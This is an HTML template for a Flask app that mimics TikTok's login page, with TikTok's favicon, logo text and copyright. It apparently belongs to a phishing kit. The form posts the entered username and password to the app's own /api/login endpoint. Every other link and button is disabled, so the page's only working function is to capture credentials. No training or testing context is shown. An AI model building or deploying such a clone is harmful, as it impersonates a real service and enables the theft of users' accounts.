<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok - Login</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    <style>
        body {
            background: #121212;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: #fff;
        }
        .tt-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .tt-box {
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .tt-logo {
            margin-bottom: 30px;
        }
        .tt-logo-text {
            font-size: 36px;
            font-weight: 700;
            color: #fff;
            letter-spacing: -1px;
        }
        .tt-logo-note {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #ff0050;
            border-radius: 50%;
            margin-left: 2px;
            vertical-align: super;
        }
        .tt-tabs {
            display: flex;
            border-bottom: 1px solid #2a2a2a;
            margin-bottom: 20px;
        }
        .tt-tab {
            flex: 1;
            padding: 12px;
            font-size: 15px;
            font-weight: 600;
            color: #a7a7a7;
            cursor: pointer;
            border-bottom: 2px solid transparent;
            transition: all 0.2s ease;
        }
        .tt-tab.active {
            color: #fff;
            border-bottom-color: #fff;
        }
        .tt-input {
            width: 100%;
            padding: 14px 16px;
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 8px;
            font-size: 16px;
            color: #fff;
            outline: none;
            margin-bottom: 12px;
            transition: all 0.2s ease;
        }
        .tt-input:focus {
            border-color: #ff0050;
        }
        .tt-input::placeholder {
            color: #606060;
        }
        .tt-link {
            color: #a7a7a7;
            font-size: 12px;
            text-decoration: none;
            float: right;
            margin-bottom: 16px;
        }
        .tt-link:hover {
            color: #fff;
        }
        .tt-btn {
            width: 100%;
            padding: 14px;
            background: #ff0050;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .tt-btn:hover:not(:disabled) {
            background: #e00045;
        }
        .tt-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .tt-divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #606060;
            font-size: 13px;
        }
        .tt-divider::before,
        .tt-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }
        .tt-divider span {
            padding: 0 10px;
        }
        .tt-alt-logins {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
        }
        .tt-alt-btn {
            width: 48px;
            height: 48px;
            border: 1px solid #2a2a2a;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            cursor: pointer;
            transition: all 0.2s ease;
            background: #1a1a1a;
            color: #fff;
        }
        .tt-alt-btn:hover {
            background: #2a2a2a;
        }
        .tt-footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #606060;
            line-height: 1.8;
        }
        .tt-footer a {
            color: #606060;
            text-decoration: none;
        }
        .tt-footer a:hover {
            color: #fff;
        }
        .tt-error {
            background: rgba(255, 0, 80, 0.1);
            border: 1px solid rgba(255, 0, 80, 0.3);
            color: #ff4444;
            padding: 10px;
            border-radius: 6px;
            font-size: 13px;
            margin-bottom: 10px;
            display: none;
            text-align: left;
        }
        .tt-loader {
            display: none;
            text-align: center;
            padding: 10px 0;
        }
        .tt-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #2a2a2a;
            border-top-color: #ff0050;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    
    <div class="tt-wrapper">
        <div class="tt-box">
            <div class="tt-logo">
                <span class="tt-logo-text">TikTok</span>
                <span class="tt-logo-note"></span>
            </div>
            
            <div class="tt-tabs">
                <div class="tt-tab active">Log in</div>
                <div class="tt-tab" onclick="return false;">Sign up</div>
            </div>
            
            <div id="login-error" class="tt-error"></div>
            
            <form id="login-form" method="POST" action="/api/login">
                <input type="text" 
                       id="username" 
                       name="username" 
                       class="tt-input" 
                       placeholder="Email, phone, or username" 
                       autocomplete="username"
                       required>
                
                <input type="password" 
                       id="password" 
                       name="password" 
                       class="tt-input" 
                       placeholder="Password" 
                       autocomplete="current-password"
                       required>
                
                <a href="#" class="tt-link" onclick="return false;">Forgot password?</a>
                
                <button type="submit" id="login-submit" class="tt-btn">Log in</button>
            </form>
            
            <div id="login-loader" class="tt-loader">
                <div class="tt-spinner"></div>
            </div>
            
            <div class="tt-divider"><span>Or continue with</span></div>
            
            <div class="tt-alt-logins">
                <div class="tt-alt-btn" onclick="return false;" title="Google">G</div>
                <div class="tt-alt-btn" onclick="return false;" title="Facebook">f</div>
                <div class="tt-alt-btn" onclick="return false;" title="Apple"></div>
                <div class="tt-alt-btn" onclick="return false;" title="Twitter">𝕏</div>
            </div>
            
            <div class="tt-footer">
                <a href="#" onclick="return false;">Terms of Service</a> | 
                <a href="#" onclick="return false;">Privacy Policy</a><br>
                © 2024 TikTok
            </div>
        </div>
    </div>
    
    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
</body>
</html>
